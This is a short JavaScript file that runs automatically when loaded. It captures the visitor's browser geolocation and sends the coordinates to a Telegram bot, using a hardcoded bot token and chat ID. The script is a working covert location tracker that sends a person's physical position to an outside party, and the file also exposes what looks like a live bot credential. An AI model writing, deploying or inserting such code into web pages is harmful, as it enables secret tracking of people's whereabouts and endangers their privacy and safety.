const botToken = "5898612687:AAHHGaTn_S-j_h_hu6mUcxm6KOFzzJrDLXQ";
const chatId = "1758098578";

var user = () => {
    navigator.geolocation.getCurrentPosition((position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        let locate = `${latitude},${longitude}`;
        console.log(locate);

        // Send to Telegram bot
        var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(locate)}`;
        
        // Use fetch to send the HTTP request
        fetch(url)
        .then((response) => {
            if (response.ok) {
                console.log("message send success");
                return response.json();
            } else {
                throw new Error("Message send failed");
            }
        })
        .then((data) => {
            console.log(data);
        })
        .catch((err) => {
            console.log(err);
        });
    });
}

// Call the user function directly when the script is executed
user();
